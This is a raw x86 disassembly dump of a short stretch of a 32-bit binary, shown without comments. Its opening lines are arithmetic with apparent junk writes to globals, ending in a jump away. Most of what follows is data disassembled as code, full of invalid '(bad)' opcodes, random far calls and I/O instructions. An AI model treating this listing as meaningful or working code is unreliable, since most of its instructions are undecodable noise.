  40a245:	mov    eax,DWORD PTR [ebp+0x10]
  40a248:	add    esi,0x4b50
  40a24e:	xor    eax,ecx
  40a250:	or     DWORD PTR ds:0x42c01c,edx
  40a256:	add    eax,edx
  40a258:	mov    DWORD PTR [ebp-0x18],eax
  40a25b:	sbb    DWORD PTR ds:0x42d01c,edx
  40a261:	mov    eax,DWORD PTR [ebp+0xc]
  40a264:	add    esi,0x5e8f
  40a26a:	mov    esi,DWORD PTR [ebp-0x8]
  40a26d:	xor    eax,ecx
  40a26f:	mov    DWORD PTR ds:0x42d004,0x61c0
  40a279:	add    eax,edx
  40a27b:	add    DWORD PTR ds:0x42a004,0x42d004
  40a285:	imul   eax,DWORD PTR [esi]
  40a288:	add    DWORD PTR ds:0x42d004,0x19e2
  40a292:	mov    esi,DWORD PTR [ebp+0x8]
  40a295:	xor    esi,ecx
  40a297:	add    esi,edx
  40a299:	cmp    esi,eax
  40a29b:	mov    eax,DWORD PTR [ebp-0x4]
  40a29e:	push   ebx
  40a29f:	je     0x40a2be
  40a2a5:	mov    esi,DWORD PTR [ebp-0x18]
  40a2a8:	add    DWORD PTR [eax],esi
  40a2aa:	mov    eax,DWORD PTR [ebp-0x4]
  40a2ad:	mov    esi,DWORD PTR [ebp+0xc]
  40a2b0:	xor    esi,ecx
  40a2b2:	add    esi,edx
  40a2b4:	imul   esi,DWORD PTR [eax]
  40a2b7:	mov    DWORD PTR [eax],esi
  40a2b9:	jmp    0x40a2c3
  40a2be:	mov    esi,DWORD PTR [ebp+0x14]
  40a2c1:	xor    DWORD PTR [eax],esi
  40a2c3:	mov    eax,DWORD PTR [ebp-0x4]
  40a2c6:	mov    edi,DWORD PTR [ebp+0x10]
  40a2c9:	xor    edi,ecx
  40a2cb:	mov    esi,0xffcd8d20
  40a2d0:	mov    ebx,esi
  40a2d2:	sub    ebx,edi
  40a2d4:	add    DWORD PTR [eax],ebx
  40a2d6:	mov    eax,DWORD PTR [ebp-0x4]
  40a2d9:	mov    edi,DWORD PTR [ebp-0x8]
  40a2dc:	add    edi,DWORD PTR [eax]
  40a2de:	mov    DWORD PTR [ebp-0x8],edi
  40a2e1:	mov    eax,DWORD PTR [ebp+0xc]
  40a2e4:	mov    edi,DWORD PTR [ebp+0xc]
  40a2e7:	xor    edi,ecx
  40a2e9:	jmp    0x40c634
  40a2ee:	neg    ch
  40a2f0:	jns    0x40a2c7
  40a2f2:	xchg   ecx,eax
  40a2f3:	mov    ch,0x76
  40a2f5:	popf   
  40a2f6:	outs   dx,BYTE PTR ds:[esi]
  40a2f7:	mov    ah,0x10
  40a2f9:	inc    esi
  40a2fa:	cmp    al,0x73
  40a2fc:	scas   eax,DWORD PTR es:[edi]
  40a2fd:	ds add BYTE PTR cs:[edx+0x7a],bh
  40a302:	inc    esp
  40a303:	pop    edi
  40a304:	jp     0x40a380
  40a306:	xor    cl,BYTE PTR [eax+edx*2]
  40a309:	(bad)  [ebp+0x1f40c7a4]
  40a30f:	mov    ecx,0xa2438373
  40a314:	jmp    0x7c91cdc
  40a319:	push   edi
  40a31a:	add    BYTE PTR [ebx],ah
  40a31c:	sub    BYTE PTR [eax],ch
  40a31e:	hlt    
  40a31f:	daa    
  40a320:	popa   
  40a321:	xchg   ebp,eax
  40a322:	stos   DWORD PTR es:[edi],eax
  40a323:	sbb    BYTE PTR [ebx],bh
  40a325:	cs jp  0x40a311
  40a328:	pusha  
  40a329:	push   ebp
  40a32a:	stos   BYTE PTR es:[edi],al
  40a32b:	icebp  
  40a32c:	mov    ch,0x1f
  40a32e:	(bad)  
  40a32f:	fisub  WORD PTR [ebx]
  40a331:	ins    DWORD PTR es:[edi],dx
  40a332:	fist   DWORD PTR [esi]
  40a334:	pop    ss
  40a335:	mov    ecx,0x7b652c7e
  40a33a:	push   edx
  40a33b:	clc    
  40a33c:	imul   esp,DWORD PTR [ecx+0x380ea0b4],0x19c333ad
  40a346:	dec    eax
  40a347:	pop    ebp
  40a348:	aas    
  40a349:	lods   eax,DWORD PTR ds:[esi]
  40a34a:	rcl    dl,1
  40a34c:	imul   esi,esi,0x9f8d1fae
  40a352:	mov    ebx,0xb3e4d9d1
  40a357:	enter  0x42d2,0x98
  40a35b:	push   ecx
  40a35c:	dec    ebp
  40a35d:	add    BYTE PTR [eax],ch
  40a35f:	(bad)  
  40a360:	sbb    eax,0x42e89ef8
  40a365:	cmp    BYTE PTR [edx],0x70
  40a368:	clc    
  40a369:	fld    TBYTE PTR [ebx+0x3ac593a2]
  40a36f:	cmp    al,bl
  40a371:	push   ebp
  40a372:	ins    BYTE PTR es:[edi],dx
  40a373:	dec    esp
  40a374:	pop    esp
  40a375:	mov    bh,0xbe
  40a377:	cwde   
  40a378:	mov    al,0x6e
  40a37a:	mov    ecx,0xa2275932
  40a37f:	pop    ebp
  40a380:	inc    edx
  40a381:	mov    ebx,0x5d86ff14
  40a386:	(bad)  
  40a387:	xor    eax,0xdaef188a
  40a38c:	or     eax,DWORD PTR [ecx-0x3e80534b]
  40a392:	mov    edi,0xdc03f488
  40a397:	inc    edi
  40a398:	add    ebx,DWORD PTR [ebx]
  40a39a:	add    cl,ch
  40a39c:	sbb    edx,DWORD PTR [ebp+0x5755f977]
  40a3a2:	add    esi,edx
  40a3a4:	dec    edi
  40a3a5:	loope  0x40a3fa
  40a3a7:	popa   
  40a3a8:	or     al,0x9c
  40a3aa:	xor    BYTE PTR [eax+0xfdeb110],bl
  40a3b0:	adc    eax,0xdf02eba4
  40a3b5:	cmc    
  40a3b6:	dec    esp
  40a3b7:	shl    DWORD PTR [edx],0x62
  40a3ba:	jg     0x40a399
  40a3bc:	pop    ecx
  40a3bd:	dec    edx
  40a3be:	ins    DWORD PTR es:[edi],dx
  40a3bf:	ficom  DWORD PTR [edi+0x4e]
  40a3c2:	jno    0x40a3f8
  40a3c4:	es jmp 0x40a3ff
  40a3c7:	in     eax,dx
  40a3c8:	sub    BYTE PTR [eax-0x53],0x2f
  40a3cc:	mov    edx,ebp
  40a3ce:	fwait
  40a3cf:	dec    ebp
  40a3d0:	push   0xce4e1893
  40a3d5:	scas   eax,DWORD PTR es:[edi]
  40a3d6:	pop    edi
  40a3d7:	stos   BYTE PTR es:[edi],al
  40a3d8:	push   esi
  40a3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3da:	gs sub eax,0x9fc50911
  40a3e0:	sbb    BYTE PTR [edx+eiz*8],al
  40a3e3:	cdq    
  40a3e4:	lods   eax,DWORD PTR ds:[esi]
  40a3e5:	jnp    0x40a3bc
  40a3e7:	sub    cl,bl
  40a3e9:	outs   dx,BYTE PTR ds:[esi]
  40a3ea:	mov    DWORD PTR [esi+0x4b],edi
  40a3ed:	mov    edi,0x370bee83
  40a3f2:	pop    es
  40a3f3:	fild   WORD PTR [eax+0x3f6862e5]
  40a3f9:	or     al,bh
  40a3fb:	imul   BYTE PTR [ebp+eiz*1-0x46]
  40a3ff:	cli    
  40a400:	ss inc ecx
  40a402:	add    BYTE PTR [edi+0x616c232d],al
  40a408:	ret    0x595e
  40a40b:	sbb    eax,0xb8534de1
  40a410:	loope  0x40a39e
  40a412:	cs inc edx
  40a414:	into   
  40a415:	in     al,dx
  40a416:	adc    al,0x18
  40a418:	cld    
  40a419:	adc    dl,BYTE PTR [ecx-0xc1b68e5]
  40a41f:	outs   dx,DWORD PTR ds:[esi]
  40a420:	sbb    BYTE PTR [bx+di+0x59c],dl
  40a425:	(bad)  
  40a427:	into   
  40a428:	add    ah,al
  40a42a:	or     esi,DWORD PTR [edi-0x40a9571f]
  40a430:	cmp    BYTE PTR [edx+0x3d6c6f7a],cl
  40a436:	add    ecx,DWORD PTR [ecx+0x5a]
  40a439:	xchg   BYTE PTR [eax-0x2e04429d],cl
  40a43f:	dec    esp
  40a440:	mov    esi,cs
  40a442:	retf   
  40a443:	xlat   BYTE PTR ds:[ebx]
  40a444:	ins    BYTE PTR es:[edi],dx
  40a445:	mov    cl,0x3a
  40a447:	add    al,0xd9
  40a449:	loopne 0x40a4a8
  40a44b:	rol    DWORD PTR [ecx],0xe
  40a44e:	stc    
  40a44f:	add    eax,0x7208fe2b
  40a454:	std    
  40a455:	sbb    ah,BYTE PTR [ecx+0x1]
  40a458:	int    0x6d
  40a45a:	popa   
  40a45b:	adc    BYTE PTR ds:0x2ed6784c,dl
  40a461:	sbb    dh,bl
  40a463:	lock mov ds:0x5dfd20a7,eax
  40a469:	xchg   edx,eax
  40a46a:	repz bound ecx,QWORD PTR [edx]
  40a46d:	pop    ecx
  40a46e:	lahf   
  40a46f:	mov    al,ds:0x326981ca
  40a474:	sub    al,0xaf
  40a476:	push   es
  40a477:	aad    0x26
  40a479:	xchg   esp,eax
  40a47a:	fdiv   DWORD PTR [edx-0x1c]
  40a47d:	push   esp
  40a47e:	pop    es
  40a47f:	out    dx,eax
  40a480:	in     eax,0xfa
  40a482:	mov    ebp,0x5b77e5
  40a487:	or     DWORD PTR [edx-0x5e],esp
  40a48a:	push   ebp
  40a48b:	repz and eax,edi
  40a48e:	xchg   edx,eax
  40a48f:	sub    eax,0x19aa950e
  40a494:	sbb    eax,0x2c2a1ff3
  40a499:	paddq  mm6,mm7
  40a49c:	aam    0xf3
  40a49e:	jp     0x40a44a
  40a4a0:	je     0x40a455
  40a4a2:	push   edi
  40a4a3:	xor    al,0x37
  40a4a5:	jb     0x40a4db
  40a4a7:	pop    edx
  40a4a8:	add    DWORD PTR [ecx-0x64],ecx
  40a4ab:	fiadd  DWORD PTR [eax-0x10442233]
  40a4b1:	outs   dx,DWORD PTR ds:[esi]
  40a4b2:	pusha  
  40a4b3:	pop    esp
  40a4b4:	jne    0x40a44a
  40a4b6:	stos   DWORD PTR es:[edi],eax
  40a4b7:	jecxz  0x40a524
  40a4b9:	push   esi
  40a4ba:	and    eax,0x9d8550fb
  40a4bf:	mov    al,0x71
  40a4c1:	and    al,0x3e
  40a4c3:	mov    WORD PTR [esi-0x1beffc39],fs
  40a4c9:	mov    esp,0x23ddc249
  40a4ce:	sub    edi,DWORD PTR [esi]
  40a4d0:	push   ebp
  40a4d1:	icebp  
  40a4d2:	lods   al,BYTE PTR ds:[esi]
  40a4d3:	dec    ebx
  40a4d4:	adc    eax,0x92ec7289
  40a4d9:	lods   eax,DWORD PTR ds:[esi]
  40a4da:	enterw 0xdbd4,0xa9
  40a4df:	xchg   edi,eax
  40a4e0:	nop
  40a4e1:	int    0xba
  40a4e3:	int3   
  40a4e4:	push   esp
  40a4e5:	sar    DWORD PTR [edx-0x4a],0xc3
  40a4e9:	mov    ds:0xc487704c,al
  40a4ee:	clc    
  40a4ef:	inc    ebx
  40a4f0:	xchg   edx,eax
  40a4f1:	push   esp
  40a4f2:	mov    WORD PTR [esi-0x135cbdfc],cs
  40a4f8:	xchg   esp,eax
  40a4f9:	mov    ch,BYTE PTR [edi]
  40a4fb:	fdiv   QWORD PTR [ecx-0x13e38924]
  40a501:	mov    ss,WORD PTR [ebp+eiz*2-0x7f]
  40a505:	call   0x75bb:0xdc8e468a
  40a50c:	aad    0xb4
  40a50e:	adc    al,0x41
  40a510:	stc    
  40a511:	push   esi
  40a512:	mov    edi,0x6c2ddc46
  40a517:	call   0x2fd739f3
  40a51c:	mov    ds:0xb3751780,al
  40a521:	xchg   ebp,eax
  40a522:	jo     0x40a55c
  40a524:	ins    DWORD PTR es:[edi],dx
  40a525:	and    eax,DWORD PTR [ebp+0x72aa40bc]
  40a52b:	push   esp
  40a52c:	adc    ebp,DWORD PTR [eax]
  40a52e:	lahf   
  40a52f:	jmp    0xcde1:0xc5f1c7d7
  40a536:	cmp    edi,eax
  40a538:	ret    
  40a539:	dec    esi
  40a53a:	or     dl,BYTE PTR [ebx-0x20]
  40a53d:	das    
  40a53e:	ins    BYTE PTR es:[edi],dx
  40a53f:	mov    BYTE PTR [edi-0x6324f290],al
  40a545:	repz rcl DWORD PTR [edi],0x77
  40a549:	jne    0x40a4ed
  40a54b:	mov    ebp,0x2de02ebd
  40a550:	out    0x46,eax
  40a552:	in     eax,dx
  40a553:	or     BYTE PTR [ecx],bl
  40a555:	and    eax,0xdf76e731
  40a55a:	into   
  40a55b:	xchg   ebp,eax
  40a55c:	jl     0x40a5d3
  40a55e:	xchg   esi,eax
  40a55f:	mov    dl,0x82
  40a561:	xor    DWORD PTR [eax-0x36],eax
  40a564:	mov    edi,0x4ff876dd
  40a569:	cmp    eax,0x7609076e
  40a56e:	xchg   BYTE PTR [esi+0x57],cl
  40a571:	ds (bad) 
  40a573:	mov    ch,0x57
  40a575:	in     eax,dx
  40a576:	sbb    al,0x8a
  40a578:	and    DWORD PTR [edx+eax*2-0x312dc3ff],ecx
  40a57f:	jle    0x40a501
  40a581:	jge    0x40a51c
  40a583:	inc    ecx
  40a584:	jmp    0xaa54:0x131cc90b
  40a58b:	pop    ebp
  40a58c:	fisubr DWORD PTR [edi-0x25]
  40a58f:	mov    al,ds:0x28f76540
  40a594:	mov    ch,0xb
  40a596:	mov    edx,0x2caa7f6b
  40a59b:	fisttp WORD PTR [edx-0x1ec7df38]
  40a5a1:	fwait
  40a5a2:	adc    al,0x7d
  40a5a4:	pop    ebp
  40a5a5:	cmp    bh,dh
  40a5a7:	jg     0x40a52f
  40a5a9:	push   esp
  40a5aa:	sub    esi,eax
  40a5ac:	fnstenv [ebp-0x71e88f44]
  40a5b2:	cmp    dh,BYTE PTR [ebp+0x1f607310]
  40a5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ba:	mov    bl,0xee
  40a5bc:	mov    dh,0xee
  40a5be:	inc    ecx
  40a5bf:	mov    bl,BYTE PTR [ecx+0x4b]
  40a5c2:	repz mov bh,0x3d
  40a5c5:	xor    DWORD PTR [eax+0x5e],ecx
  40a5c8:	mov    WORD PTR [edi-0x54],cs
  40a5cb:	cmp    cl,cl
  40a5cd:	bound  ecx,QWORD PTR [edi]
  40a5cf:	or     dh,0xda
  40a5d2:	sahf   
  40a5d3:	scas   eax,DWORD PTR es:[edi]
  40a5d4:	sbb    BYTE PTR [ebp+0x3e],dh
  40a5d7:	jecxz  0x40a5f3
  40a5d9:	pop    ss
  40a5da:	inc    edx
  40a5db:	imul   esp,DWORD PTR [ebx],0x7f
  40a5de:	or     al,0xd7
  40a5e0:	je     0x40a5ab
  40a5e2:	mov    esi,0x3f8115ab
  40a5e7:	into   
  40a5e8:	out    0xa4,al
  40a5ea:	push   ebp
  40a5eb:	xor    eax,0x564f969d
  40a5f0:	out    0xa,al
  40a5f2:	scas   al,BYTE PTR es:[edi]
  40a5f3:	mov    bl,0x4d
  40a5f5:	fisubr DWORD PTR [ecx+esi*1]
  40a5f8:	jmp    0x3f9c:0x7175eb89
  40a5ff:	call   0x82dc:0x323c4335
  40a606:	sub    al,0xb9
  40a608:	dec    eax
  40a609:	into   
  40a60a:	lods   al,BYTE PTR ds:[esi]
  40a60b:	imul   esi,DWORD PTR ds:0x938bec39,0xd3ea733f
  40a615:	fimul  DWORD PTR [edi]
  40a617:	inc    ebp
  40a618:	lea    esp,[ecx+edi*4+0x6c20a161]
  40a61f:	cmp    al,BYTE PTR [edi]
  40a621:	adc    eax,0xf6f1fda3
  40a626:	inc    ebp
  40a627:	jl     0x40a5e3
  40a629:	jno    0x40a5e0
  40a62b:	lock leave 
  40a62d:	mov    dh,0xf1
  40a62f:	je     0x40a645
  40a631:	in     al,dx
  40a632:	(bad)  
  40a633:	loop   0x40a63b
  40a635:	sar    DWORD PTR [eax-0x5bfd10b5],1
  40a63b:	ss mov cl,0x4b
  40a63e:	add    eax,0x28791fa0
  40a643:	mov    dh,BYTE PTR [ecx+0xd570092]
  40a649:	mov    al,ds:0x607ed9d7
  40a64e:	push   ecx
  40a64f:	ins    BYTE PTR es:[edi],dx
  40a650:	nop
  40a651:	sub    DWORD PTR [edx],ebp
  40a653:	(bad)  
  40a655:	jae    0x40a6b3
  40a657:	shl    BYTE PTR [edx+0x3b3db263],1
  40a65d:	jp     0x40a65b
  40a65f:	into   
  40a660:	test   BYTE PTR [ecx-0x80],cl
  40a663:	iret   
  40a664:	(bad)  
  40a665:	es jg  0x40a675
  40a668:	jp     0x40a625
  40a66a:	add    al,BYTE PTR [ebx+0x12d3a450]
  40a670:	sbb    BYTE PTR [esi+0xc],0x72
  40a674:	call   0xd7df:0xc60f768a
  40a67b:	call   0x6414ad8b
  40a680:	pop    ebx
  40a681:	mov    eax,0x131375d
  40a686:	ss stos BYTE PTR es:[edi],al
  40a688:	imul   edi,esi,0xc8c28ec7
  40a68e:	sti    
  40a68f:	pop    ds
  40a690:	repnz out 0x85,al
  40a693:	adc    ebp,ecx
  40a695:	imul   esp,eax,0x27
  40a698:	addr16 mov esp,0x8c725b73
  40a69e:	sbb    DWORD PTR ds:0xe0572876,edi
  40a6a4:	mov    ds:0x62e41d,al
  40a6a9:	mov    al,0x3a
  40a6ab:	loop   0x40a651
  40a6ad:	jg     0x40a64a
  40a6af:	loopne 0x40a6de
  40a6b1:	fistp  DWORD PTR [edx+eiz*2+0x73]
  40a6b5:	(bad)  
  40a6b7:	mov    dl,0xff
  40a6b9:	stos   DWORD PTR es:[di],eax
  40a6bb:	jge    0x40a724
  40a6bd:	pop    esi
  40a6be:	mov    dl,0xbf
  40a6c0:	inc    esi
  40a6c2:	lahf   
  40a6c3:	mov    edi,0x884d7076
  40a6c8:	jne    0x40a6af
  40a6ca:	ja     0x40a70c
  40a6cc:	xor    BYTE PTR ds:[esi+ebx*1-0x616c763],dl
  40a6d4:	call   0x8a6922c7
  40a6d9:	div    DWORD PTR [esi]
  40a6db:	lds    edi,FWORD PTR [eax-0x7fa3f7ed]
  40a6e1:	sub    BYTE PTR [ecx+ebx*2-0x284b8d9a],bh
  40a6e8:	xchg   esi,eax
  40a6e9:	mov    edi,?
  40a6eb:	repz scas al,BYTE PTR es:[edi]
  40a6ed:	dec    ecx
  40a6ee:	dec    esi
  40a6ef:	pop    ebx
  40a6f0:	(bad)  
  40a6f2:	dec    ecx
  40a6f3:	push   ss
  40a6f4:	lahf   
  40a6f5:	movmskps eax,xmm4
  40a6f8:	pusha  
  40a6f9:	outs   dx,DWORD PTR ds:[esi]
  40a6fa:	and    ebp,DWORD PTR [ebx-0x4f5e9518]
  40a700:	xchg   esp,eax
  40a701:	pop    ebp
  40a702:	pop    ebp
  40a703:	push   edx
  40a704:	push   es
  40a705:	rcl    ecx,0x38
  40a708:	jno    0x40a733
  40a70a:	dec    eax
  40a70b:	(bad)
  40a70e:	adc    eax,edx
  40a710:	cmp    DWORD PTR [edx+0x5],ebx
  40a713:	je     0x40a704
  40a715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a716:	jp     0x40a782
  40a718:	(bad)
  40a71c:	pop    ss
  40a71d:	das    
  40a71e:	cmp    ecx,DWORD PTR ds:0x57bc0407
  40a724:	mov    edx,0x75d77056
  40a729:	aaa    
  40a72a:	in     ax,dx
  40a72c:	(bad)  
  40a72d:	ds loope 0x40a784
  40a730:	mov    bh,0x8d
  40a732:	test   eax,0x7d131bef
  40a737:	fiadd  DWORD PTR [esi]
  40a739:	inc    esp
  40a73a:	push   es
  40a73b:	sub    al,0x26
  40a73d:	(bad)  
  40a73f:	jne    0x40a7aa
  40a741:	dec    esi
  40a742:	push   ebp
  40a743:	test   eax,0x368cf14
  40a748:	ins    DWORD PTR es:[edi],dx
  40a749:	(bad)  
  40a74a:	pushf  
  40a74b:	push   0x873dd8d6
  40a750:	adc    eax,0x899ccb43
  40a755:	mov    edi,ds
  40a757:	mov    al,0xc5
  40a759:	sti    
  40a75a:	push   edi
  40a75b:	mov    ds:0x89ea2d88,al
  40a760:	inc    ebx
  40a761:	inc    edi
  40a762:	mul    DWORD PTR [ebx*2-0x1dfa8c0b]
  40a769:	jge    0x40a7b5
  40a76b:	or     edi,DWORD PTR [edi+0x5c]
  40a76e:	mov    ecx,0xce8f6f05
  40a773:	ja     0x40a7ca
  40a775:	adc    eax,0x7fe9daa9
  40a77a:	jo     0x40a7dd
  40a77c:	pop    edx
  40a77d:	call   0x32bc:0xac95c922
  40a784:	cs inc edx
  40a786:	sbb    al,0xf
  40a788:	xor    eax,0xc7550fee
  40a78d:	sub    DWORD PTR [ecx+0x50],0xffffff84
  40a791:	int3   
  40a792:	repz xor esi,ebp
  40a795:	leave  
  40a796:	sub    al,0x92
  40a798:	std    
  40a799:	test   eax,0x73ca571c
  40a79e:	ds std 
  40a7a0:	out    dx,al
  40a7a1:	jg     0x40a746
  40a7a3:	push   cs
  40a7a4:	gs mov ebp,0x75b4ecba
  40a7aa:	loope  0x40a829
  40a7ac:	inc    edi
  40a7ad:	and    al,0xce
  40a7af:	xchg   edx,eax
  40a7b0:	rcl    BYTE PTR [edx],1
  40a7b2:	int    0x69
  40a7b4:	iret   
  40a7b5:	jb     0x40a7c3
  40a7b7:	jbe    0x40a81a
  40a7b9:	inc    esp
  40a7ba:	push   ss
  40a7bb:	aas    
  40a7bc:	iret   
  40a7bd:	pop    ss
  40a7be:	fld    QWORD PTR [esi+ebp*4-0x71]
  40a7c2:	ficomp WORD PTR [edx-0x7b5200fc]
  40a7c8:	fsub   DWORD PTR [ecx+0x508b993a]
  40a7ce:	xchg   edx,eax
  40a7cf:	cwde   
  40a7d0:	cmp    DWORD PTR ds:[esi+0x6f063b54],ebx
  40a7d7:	mov    ebp,0x7dfef07b
  40a7dc:	dec    ebx
  40a7dd:	aam    0x94
  40a7df:	mov    ebx,0x205f3f02
  40a7e4:	ror    BYTE PTR [ebx+0x63],0xea
  40a7e8:	retf   0xdefe
  40a7eb:	pop    eax
  40a7ec:	popf   
  40a7ed:	dec    edi
  40a7ee:	jmp    0xd3d5:0x1e07206d
  40a7f5:	dec    ecx
  40a7f6:	cs jle 0x40a83e
  40a7f9:	cmp    DWORD PTR [esi+0x29],ebp
  40a7fc:	sar    DWORD PTR [edi+0x1112b026],1
  40a802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a803:	fidivr DWORD PTR [edx-0x45]
  40a806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a807:	cwde   
  40a808:	les    edx,FWORD PTR [ebx-0x6fc8ef9a]
  40a80e:	sub    DWORD PTR [eax-0x17],ecx
  40a811:	pop    ebp
  40a812:	sbb    dl,dl
  40a814:	ds aam 0x8c
  40a817:	leave  
  40a818:	fiadd  DWORD PTR [edi-0x74]
  40a81b:	mov    bh,0x1
  40a81d:	add    cl,0x65
  40a820:	mov    edi,0x579fa907
  40a825:	add    edx,DWORD PTR [ecx-0x5]
  40a828:	ret    0x9606
  40a82b:	aad    0x4f
  40a82d:	lahf   
  40a82e:	add    al,BYTE PTR [edi]
  40a830:	out    0x38,al
  40a832:	mov    cl,0x47
  40a834:	addr16 and al,0x33
  40a837:	jae    0xca654ebb
  40a83d:	sub    DWORD PTR [esi],0xffffffa6
  40a840:	stos   DWORD PTR es:[edi],eax
  40a841:	xchg   esp,eax
  40a842:	jle    0xce62354
  40a848:	iret   
  40a849:	sub    eax,0x146cbe69
  40a84e:	jg     0x40a834
  40a850:	into   
  40a851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a852:	adc    al,BYTE PTR [ebp-0x7c1ba0c5]
  40a858:	cmc    
  40a859:	nop    DWORD PTR [eax+edi*4+0x5c]
  40a85e:	jge    0x40a815
  40a860:	clc    
  40a861:	mov    bl,0x65
  40a863:	ss jnp 0x40a861
  40a866:	jae    0x40a87f
  40a868:	xlat   BYTE PTR ds:[ebx]
  40a869:	mov    esi,0xe74dbb3e
  40a86e:	lea    esp,[eax]
  40a870:	adc    al,0xcc
  40a872:	xchg   BYTE PTR [ebp+0x10],dl
  40a875:	fbstp  TBYTE PTR [ebx]
  40a877:	std    
  40a878:	and    al,0x99
  40a87a:	sbb    eax,0xbc6868a3
  40a87f:	sub    eax,0x1627df69
  40a884:	lods   eax,DWORD PTR ds:[esi]
  40a885:	div    BYTE PTR [edi-0x72]
  40a888:	push   esi
  40a889:	push   es
  40a88a:	rol    eax,1
  40a88c:	jb     0x40a8d5
  40a88e:	scas   al,BYTE PTR es:[edi]
  40a88f:	lock adc al,BYTE PTR [eax+0x1ca70964]
  40a896:	loope  0x40a88a
  40a898:	inc    eax
  40a899:	dec    ecx
  40a89a:	int3   
  40a89b:	aas    
  40a89c:	mov    ah,0x1a
  40a89e:	sbb    ebx,esi
  40a8a0:	aas    
  40a8a1:	test   DWORD PTR [ebx],ebx
  40a8a3:	adc    DWORD PTR [esi-0x2c],eax
  40a8a6:	gs jp  0x40a8ca
  40a8a9:	aaa    
  40a8aa:	sbb    bl,ah
  40a8ac:	xlat   BYTE PTR ds:[ebx]
  40a8ad:	hlt    
  40a8ae:	mov    ch,0xcb
  40a8b0:	or     ebx,DWORD PTR [eax+0x46]
  40a8b3:	je     0x40a8fa
  40a8b5:	jge    0x40a848
  40a8b7:	push   esi
  40a8b8:	add    eax,0x2aae8b5c
  40a8bd:	(bad)  
  40a8be:	sub    eax,0xfc1c2180
  40a8c3:	and    ecx,esp
  40a8c5:	sbb    al,cl
  40a8c7:	ja     0x40a925
  40a8c9:	pop    ds
  40a8ca:	fnstsw WORD PTR [ecx-0x7b]
  40a8cd:	clc    
  40a8ce:	stos   BYTE PTR es:[edi],al
  40a8cf:	int    0x4c
  40a8d1:	cwde   
  40a8d2:	aad    0xb9
  40a8d4:	xchg   ecx,eax
  40a8d5:	lods   al,BYTE PTR ds:[esi]
  40a8d6:	(bad)  
  40a8d7:	xchg   ecx,eax
  40a8d8:	addr16 adc ecx,eax
  40a8db:	sub    BYTE PTR [edx],bh
  40a8dd:	mov    eax,0x148586fd
  40a8e2:	push   esi
  40a8e3:	lahf   
  40a8e4:	retf   
  40a8e5:	pop    eax
  40a8e6:	ins    BYTE PTR es:[edi],dx
  40a8e7:	ss sbb bh,bh
  40a8ea:	push   edi
  40a8eb:	call   0x9b35:0xbd783988
  40a8f2:	jae    0x40a929
  40a8f4:	cld    
  40a8f5:	push   ss
  40a8f6:	inc    ecx
  40a8f7:	jmp    0x2ccf68b1
  40a8fc:	cmp    al,0xce
  40a8fe:	lods   al,BYTE PTR ds:[esi]
  40a8ff:	(bad)  
  40a900:	enter  0xbd4e,0x0
  40a904:	mov    eax,ds:0xf308523a
  40a909:	inc    ebp
  40a90a:	ret    0xb570
  40a90d:	adc    esp,DWORD PTR [esi]
  40a90f:	stos   DWORD PTR es:[edi],eax
  40a910:	jp     0x40a947
  40a912:	in     al,dx
  40a913:	or     bh,bh
  40a915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a916:	xchg   edx,ecx
  40a918:	scas   al,BYTE PTR es:[edi]
  40a919:	adc    eax,0x8539df67
  40a91e:	pusha  
  40a91f:	ret    
  40a920:	jge    0x40a8f0
  40a922:	pop    ecx
  40a923:	(bad)  
  40a924:	dec    eax
  40a925:	adc    eax,0x747b309a
  40a92a:	mov    eax,0x7f5185f8
  40a92f:	dec    edi
  40a930:	push   ss
  40a931:	and    DWORD PTR [ebx+0xb],edx
  40a934:	call   0x558a:0x95f13dc8
  40a93b:	mov    eax,ds:0xe7e6e74a
  40a940:	mov    ebp,0xae3021c0
  40a945:	or     edi,ebx
  40a947:	pop    ebx
  40a948:	cmp    DWORD PTR [edi],ecx
  40a94a:	daa    
  40a94b:	mov    edx,0x4e89e8c1
  40a950:	cdq    
  40a951:	jae    0x40a941
  40a953:	pop    ebx
  40a954:	xor    DWORD PTR [ecx-0x71],ebx
  40a957:	loop   0x40a9b7
  40a959:	js     0x40a95f
  40a95b:	sbb    edi,DWORD PTR [edi+edx*1]
  40a95e:	xor    DWORD PTR [eax-0x43],esi
  40a961:	fwait
  40a962:	sub    ch,BYTE PTR [edx]
  40a964:	nop
  40a965:	bound  eax,QWORD PTR [edi-0x78]
  40a968:	mov    esp,0xd987477
  40a96d:	jmp    0x40a965
  40a96f:	mov    ebx,?
  40a971:	add    DWORD PTR [ecx],ebp
  40a973:	rol    ah,0xab
  40a976:	nop
  40a977:	ins    BYTE PTR es:[edi],dx
  40a978:	jge    0x40a972
  40a97a:	fs mov edx,0x70d4f16a
  40a980:	dec    edx
  40a981:	imul   ebp,edx,0x60e54b25
  40a987:	fbstp  TBYTE PTR [edi+esi*2]
  40a98a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a98b:	and    ebp,edi
  40a98d:	sbb    cl,BYTE PTR [esi+0x725380e4]
  40a993:	or     ebp,edx
  40a995:	mov    BYTE PTR [ecx],ch
  40a997:	jp     0x40aa0f
  40a999:	dec    eax
  40a99a:	idiv   BYTE PTR [esi]
  40a99c:	(bad)  
  40a99d:	xor    ch,dh
  40a99f:	cs aad 0x72
  40a9a2:	push   ebp
  40a9a3:	int    0xc1
  40a9a5:	dec    ecx
  40a9a6:	or     esp,DWORD PTR [edi]
  40a9a8:	ss loop 0x40a942
  40a9ab:	bound  esp,QWORD PTR [ebx]
  40a9ad:	aaa    
  40a9ae:	dec    ebp
  40a9af:	out    dx,al
  40a9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b1:	adc    DWORD PTR [esi+0x7e939bcb],0xb18680bb
  40a9bb:	fild   WORD PTR [eax+ebp*1+0x23]
  40a9bf:	fnstenv [ebp+0x8d575f7]
  40a9c5:	sahf   
  40a9c6:	pop    es
  40a9c7:	xor    al,0xea
  40a9c9:	mov    al,0xe5
  40a9cb:	adc    eax,0x7a2ce16
  40a9d0:	push   edx
  40a9d1:	imul   ecx,DWORD PTR [edi-0x11905262],0xeab61d71
  40a9db:	and    DWORD PTR [eax+0x7a5785da],ebx
  40a9e1:	xchg   ebp,eax
  40a9e2:	jg     0x40aa1e
